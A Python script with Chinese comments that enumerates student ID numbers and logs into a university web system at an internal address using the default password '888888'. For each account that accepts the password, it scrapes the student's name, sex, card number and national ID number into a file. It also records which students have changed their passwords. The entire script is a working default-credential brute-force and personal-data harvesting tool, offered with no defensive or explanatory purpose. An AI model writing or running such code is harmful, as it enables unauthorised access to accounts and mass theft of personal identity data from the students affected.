#   Author: Hockey Loon
#   Version: 1.0.1
#   Data: 2014-12-23
#   Python Version: 3.4.2
#
#   还存在的问题：
#       一些账号会遗漏，原因不明（学院代号为16那里）
#       港澳台通行证或护照与身份证对齐
#       遇到连续注销的两个账号的话，后面的账号会遗漏

import urllib
import urllib.request
import urllib.parse
import http.cookiejar
import re


class loginRLKQ:
    post_data="";


    #login方法需要加入post数据
    def login(self,loginurl,encode):
        #模拟登陆
        req=urllib.request.Request(loginurl,self.post_data)
        rep=urllib.request.urlopen(req)
        d=rep.read()
        #print(d)
        d=d.decode(encode)
        return d
if __name__=="__main__":
    #实例化类
    x=loginRLKQ()
    #先创建文件
    sName = 'D:\Items\\tiyuxueyuan.txt'
    file = open(sName,'w+',encoding='utf-8')

    # u1为年级代号
    for u1 in range (8,14) :
    # 将u1数字转化成两位数的字符串
        u1 = "%02d" % u1
        # u2为学院代号，u2s为学院列表
        u2s = list(range(11,28))
        u2s.extend([30,34,95,97,98,99])
        for u2 in u2s :
            u2 = "%d" % u2
            #u3、u4为专业代号
            for u3 in range (1,6) :
                u3 = "%d" % u3
                for u4 in range (0,8) :
                    u4 = "%d" % u4
                    # u5为班级代号
                    for u5 in range (1,10) :
                        u5 = "%d" % u5
                        # u6为学号代号
                        for u6 in range (1,100) :
                            u6 = "%03d" % u6
                            user_name = u1 + u2 + u3 + u4 + u5 + u6

                            #给post数据赋值
                            x.post_data=urllib.parse.urlencode({
                                '__VIEWSTATE':'/wEPDwUJNDc3MzU0MDQ2ZBgBBR5fX0NvbnRyb2xzUmVxdWlyZVBvc3RCYWNrS2V5X18WAQUITG9naW5CdG72d4FJaDIMUJpstCKUTX9OwViZPg==',
                                 '__EVENTVALIDATION':'/wEWBwLe1rCYBgKvruq2CALmmdGVDAKNi6WLBgKSi6WLBgKTi6WLBgK5raCZA2MlGp0QACxC6iZHW5sfai0zZV3y',
                                'UserName':user_name,
                                'Pwd':'888888',
                                'DropDownList1':'0',
                                'LoginBtn.x':'17',
                                'LoginBtn.y':'6'
                            }).encode(encoding="utf-8")

                            #处理cookies
                            cj=http.cookiejar.CookieJar()
                            opener=urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
                            opener.addheaders=[('User-Agent','Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)')]
                            #初始化全局opener
                            urllib.request.install_opener(opener)

                            #登陆
                            y=x.login("http://10.20.12.51:8007/Loginmj.aspx","utf-8")

                            #验证密码错误或用户名不正确
                            if "密码错误" in y:
                                m = user_name+"  密码已修改" + "\n"
                                file.write(m)
                                print(user_name + "密码已修改")
                            elif "信息" in y:
                                find_re = re.compile(r'<tr>.+?LabName" style="">(.+?)</span>.+?LabSex" style="">(.+?)</span>.+?Labacout" style="">(.+?)</span>.+?LabID" style="POSITION: static">(.+?)</span>.+?Label3.+?Labdept" style="POSITION: static">(.+?)</span>', re.DOTALL)
                                for s in find_re.findall(y) :
                                    name = s[0]
                                    sex = s[1]
                                    card_number = s[2]
                                    id_number = s[3]
                                    class_name = s[4]
                                    #让两个字、三个字、四个字的名字对齐
                                    if len(name) == 2 :
                                        name = name + "    "
                                    elif len(name) == 3 :
                                        name = name + "  "
                                    if len(id_number) == 15 :
                                        id_number = id_number + "   "
                                    m = user_name + "  " + name + "  " + sex + "  " + card_number + "  " + id_number + "  " + class_name + "\n"
                                    file.write(m)
                                    print(user_name)

                            #有时候学号被注销，检验此学号的下一个是否存在，如果存在，则u6继续加；如果不存在，则结束u6的for循环
                            else:
                                u6 = int(u6) + 1
                                u6 = "%03d" % u6
                                user_name = u1 + u2 + u3 + u4 + u5 + u6

                                #给post数据赋值
                                x.post_data=urllib.parse.urlencode({
                                    '__VIEWSTATE':'/wEPDwUJNDc3MzU0MDQ2ZBgBBR5fX0NvbnRyb2xzUmVxdWlyZVBvc3RCYWNrS2V5X18WAQUITG9naW5CdG72d4FJaDIMUJpstCKUTX9OwViZPg==',
                                     '__EVENTVALIDATION':'/wEWBwLe1rCYBgKvruq2CALmmdGVDAKNi6WLBgKSi6WLBgKTi6WLBgK5raCZA2MlGp0QACxC6iZHW5sfai0zZV3y',
                                    'UserName':user_name,
                                    'Pwd':'888888',
                                    'DropDownList1':'0',
                                    'LoginBtn.x':'17',
                                    'LoginBtn.y':'6'
                                }).encode(encoding="utf-8")

                                #处理cookies
                                cj=http.cookiejar.CookieJar()
                                opener=urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
                                opener.addheaders=[('User-Agent','Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)')]
                                #初始化全局opener
                                urllib.request.install_opener(opener)

                                #登陆
                                y=x.login("http://10.20.12.51:8007/Loginmj.aspx","utf-8")

                                #验证密码错误或用户名不正确
                                if "密码错误" in y:
                                    u6 = int(u6) - 1
                                    u6 = "%03d" % u6
                                    user_name = u1 + u2 + u3 + u4 + u5 + u6
                                    m = user_name + "  账号被注销" + "\n"
                                    file.write(m)
                                    print(user_name + "账号被注销")
                                elif "信息" in y:
                                    u6 = int(u6) - 1
                                    u6 = "%03d" % u6
                                    user_name = u1 + u2 + u3 + u4 + u5 + u6
                                    m = user_name + "  账号被注销" + "\n"
                                    file.write(m)
                                    print(user_name + "账号被注销")
                                else:
                                    break

    # 最后关闭文档
    file.close()



